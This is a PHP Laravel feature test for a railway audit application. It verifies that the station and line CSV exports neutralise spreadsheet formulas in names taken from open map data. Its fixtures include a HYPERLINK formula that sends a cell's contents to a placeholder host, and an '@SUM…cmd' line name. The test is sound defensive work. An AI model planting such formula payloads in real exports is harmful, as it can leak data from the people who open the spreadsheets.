<?php

namespace Tests\Feature;

use App\Models\Era;
use App\Models\Line;
use App\Models\Station;
use App\Services\SegmentAudit\SegmentAudits;
use App\Services\StationAudit\StationAuditQuery;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Tests\TestCase;

/**
 * Exports CSV de relecture des audits (`/validate/audit/stations/export.csv`,
 * `/validate/audit/segments/export.csv`) : un nom de gare ou de ligne vient de sources ouvertes à
 * tous (OSM, OHM, Wikidata). Un nom qui commence par `=`, `+`, `-` ou `@` ne doit pas devenir une
 * formule dans le tableur du relecteur (App\Support\CsvSafe) ; les nombres négatifs restent intacts.
 */
class AuditCsvFormulaTest extends TestCase
{
    use RefreshDatabase;

    private const FORMULA = '=HYPERLINK("https://exemple.invalid/?x="&A1,"Gare")';

    /** @return list<list<string>> */
    private function rows(callable $write): array
    {
        $out = fopen('php://memory', 'w+');
        $this->assertIsResource($out);
        $write($out);
        rewind($out);
        $csv = (string) stream_get_contents($out);
        fclose($out);
        $lines = array_values(array_filter(explode("\n", ltrim($csv, "\u{FEFF}"))));

        return array_map(fn (string $l): array => str_getcsv($l, ',', '"', ''), $lines);
    }

    public function test_the_station_audit_export_neutralises_a_formula_in_a_name(): void
    {
        $station = Station::factory()->create(['slug' => 'piege', 'name' => self::FORMULA, 'department_code' => '61', 'status' => 'active']);
        DB::table('station_audits')->insert([
            'station_id' => $station->id, 'placement_grade' => 'disagree', 'families' => 2, 'nearest_agreeing_m' => 150, 'farthest_precise_m' => 150,
            'track_offset_m' => -3, 'positions' => '[]', 'opening_grade' => 'sourced', 'closure_grade' => 'not_applicable', 'services' => '{}',
            'checks' => '[]', 'checks_count' => 0, 'region_code' => '28', 'rule_version' => 'test', 'audited_at' => now(),
            'created_at' => now(), 'updated_at' => now(),
        ]);

        $rows = $this->rows(fn ($out) => app(StationAuditQuery::class)->writeCsv($out, [
            'grade' => 'all', 'region' => null, 'check' => null, 'opening' => null, 'closure' => null, 'line' => null, 'q' => null, 'sort' => 'spread',
        ]));

        $this->assertCount(2, $rows);
        $this->assertSame("'".self::FORMULA, $rows[1][2]);
        $this->assertSame('-3', $rows[1][11], 'un nombre négatif reste un nombre');
    }

    public function test_the_segment_audit_export_neutralises_a_formula_in_a_line_name(): void
    {
        $era = Era::factory()->create(['year' => 2030, 'label' => 'Aujourd’hui', 'is_current' => true]);
        $line = Line::factory()->create(['slug' => 'rfn-333333', 'code' => '333333', 'name' => '@SUM(1+1)*cmd']);
        DB::table('segment_audits')->insert([
            'era_id' => $era->id, 'line_id' => $line->id, 'segment_id' => null, 'scope' => 'line', 'status' => null, 'traffic_type' => null,
            'trace_source' => null, 'length_m' => 1000, 'classification_grade' => 'good', 'placement_grade' => 'good', 'accuracy_grade' => 'good',
            'trace_grade' => 'good', 'worst_grade' => 'good', 'score' => 0, 'evidence' => json_encode(['segments' => 1]),
            'rule_version' => 'test', 'audited_at' => now(), 'created_at' => now(), 'updated_at' => now(),
        ]);

        $rows = $this->rows(fn ($out) => app(SegmentAudits::class)->writeCsv($out, $era->id, 2030, []));

        $this->assertCount(2, $rows);
        $this->assertSame('333333', $rows[1][0]);
        $this->assertSame("'@SUM(1+1)*cmd", $rows[1][2]);
    }
}
